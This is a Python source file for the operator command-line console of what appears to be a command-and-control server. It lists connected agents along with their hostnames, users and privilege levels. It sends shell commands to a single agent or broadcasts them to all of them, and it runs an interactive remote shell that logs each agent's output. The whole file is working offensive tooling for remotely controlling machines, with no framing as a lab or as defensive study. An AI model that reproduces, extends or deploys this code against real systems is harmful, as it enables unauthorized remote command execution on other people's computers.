import json
import time, sys
from queue import Empty  # ← needed for inbox.get timeouts

from c2.server.session import SessionRegistry
from c2.server.protocol import exec_request
from c2.server.transport import send_message

class CLI:
    def __init__(self, registry: SessionRegistry, logger, log_file: str):
        self.reg = registry
        self.logger = logger
        self.log_file = log_file
        self.selected_id = None
        self.running = True

    def print_help(self):
        print("""Available commands:
  help                     Show this help
  list                     List connected agents
  select <short_id>        Select agent by short id prefix
  info                     Show info of selected agent
  send <command>           Send shell command to selected agent
  broadcast <command>      Send shell command to all agents
  read <short_id>          Read next incoming message for agent (non-blocking)
  logs [n]                 Show last n lines from server.log (default 50)
  talk <short_id>          Interactive shell with selected agent
  quit                     Shutdown server
""")

    def list_agents(self):
        agents = self.reg.list().values()
        if not agents:
            print("No agents connected.")
            return
        print(f"{'ShortID':10} {'Addr':22} {'Hostname':20} {'OS':15} {'User':15} {'Priv':7} {'PID':6} {'Connected'}")
        for a in agents:
            info = a.info.summary()
            print(f"{a.short:10} {info['addr']:22} {str(info['hostname'])[0:19]:20} {str(info['os'])[0:14]:15} "
                  f"{str(info['username']):15} {str(info['privilege']):7} {str(info['pid']):6} {info['connected_at']}")

    def select_agent(self, short_prefix: str):
        a = self.reg.get_by_short_prefix(short_prefix)
        if not a:
            print("Agent not found by that short id.")
            return
        self.selected_id = a.info.id
        print(f"Selected agent {a.short} ({a.info.hostname})")

    def show_selected_info(self):
        if not self.selected_id:
            print("No agent selected.")
            return
        a = self.reg.get(self.selected_id)
        if not a:
            print("Selected agent disconnected.")
            self.selected_id = None
            return
        print(json.dumps(a.info.summary(), indent=2, ensure_ascii=False))

    def send_command(self, cmd: str):
        if not self.selected_id:
            print("No agent selected.")
            return
        a = self.reg.get(self.selected_id)
        if not a:
            print("Selected agent disconnected.")
            self.selected_id = None
            return
        payload = exec_request(cmd)
        try:
            with a.lock:
                send_message(a.conn, payload)
            print(f"Sent command to {a.short}")
            # per-agent log
            a.logger.info(">> %s", cmd)
        except Exception as e:
            a.logger.exception("send failed: %s", e)
            print("Failed to send command.")

    def broadcast(self, cmd: str):
        agents = list(self.reg.list().values())
        if not agents:
            print("No agents to broadcast to.")
            return
        for a in agents:
            try:
                with a.lock:
                    send_message(a.conn, exec_request(cmd))
                a.logger.info(">> [broadcast] %s", cmd)
            except Exception as e:
                a.logger.exception("broadcast failed: %s", e)
        print("Broadcast sent.")

    def read_incoming(self, short_prefix: str):
        a = self.reg.get_by_short_prefix(short_prefix)
        if not a:
            print("Agent not found.")
            return
        try:
            msg = a.inbox.get_nowait()
        except Exception:
            print("No pending messages for that agent.")
            return

        print("Message:")
        print(json.dumps(msg, indent=2, ensure_ascii=False))

        # Per-agent logging for exec_result
        if msg.get("type") == "exec_result":
            p = msg.get("payload", {}) or {}
            rc = p.get("exit") if "exit" in p else p.get("returncode")
            out = p.get("stdout", "") or ""
            err = p.get("stderr", "") or ""
            a.logger.info("<< exit=%s", rc if rc is not None else "?")
            if out.strip():
                a.logger.info("[STDOUT]\n%s", out)
            if err.strip():
                a.logger.info("[STDERR]\n%s", err)

            print("--- STDOUT ---")
            print(out)
            print("--- STDERR ---")
            print(err)
            print("--------------")

    def show_logs(self, n: int = 50):
        try:
            with open(self.log_file, "r", encoding="utf-8") as fh:
                lines = fh.readlines()
            for line in lines[-n:]:
                print(line.rstrip())
        except Exception as e:
            print("Failed to read logs:", e)

    def interactive_talk(self, short_prefix: str):
        a = self.reg.get_by_short_prefix(short_prefix)
        if not a:
            print("Agent not found by that short id.")
            return

        self.selected_id = a.info.id
        print(f"Interactive with {a.short} ({a.info.hostname}). Type ':quit' or CTRL+C to exit.")

        while True:
            try:
                prompt = f"{a.short}$ "
                line = input(prompt)
                # echo operator command so CLI recorder captures it
                print(f"{prompt}{line}")
                cmd = line.strip()
            except (KeyboardInterrupt, EOFError):
                print("\nExiting.")
                break

            if not cmd:
                continue
            if cmd in (":quit", ":q", "quit", "exit"):
                break

            # send
            try:
                with a.lock:
                    send_message(a.conn, exec_request(cmd))
                a.logger.info(">> %s", cmd)
            except Exception as e:
                print(f"[send failed] {e}")
                a.logger.exception("interactive send failed: %s", e)
                continue

            # wait for result
            t0, timeout = time.time(), 30.0
            while True:
                if time.time() - t0 > timeout:
                    print("[timeout]")
                    a.logger.warning("<< timeout waiting for result")
                    break
                try:
                    msg = a.inbox.get(timeout=0.2)
                except Empty:
                    continue

                if isinstance(msg, dict) and msg.get("type") == "exec_result":
                    p = msg.get("payload", {}) or {}
                    out, err = p.get("stdout", "") or "", p.get("stderr", "") or ""
                    rc = p.get("exit") if "exit" in p else p.get("returncode")

                    # print to operator
                    if out:
                        sys.stdout.write(out + ("" if out.endswith("\n") else "\n")); sys.stdout.flush()
                    if err:
                        sys.stderr.write(err + ("" if err.endswith("\n") else "\n")); sys.stderr.flush()

                    # per-agent log
                    a.logger.info("<< exit=%s", rc if rc is not None else "?")
                    if out.strip():
                        a.logger.info("[STDOUT]\n%s", out)
                    if err.strip():
                        a.logger.info("[STDERR]\n%s", err)
                    break
                else:
                    # non-exec messages, log verbatim
                    try:
                        a.logger.info("[MSG]\n%s", json.dumps(msg, ensure_ascii=False))
                    except Exception:
                        a.logger.info("[MSG] %s", str(msg))
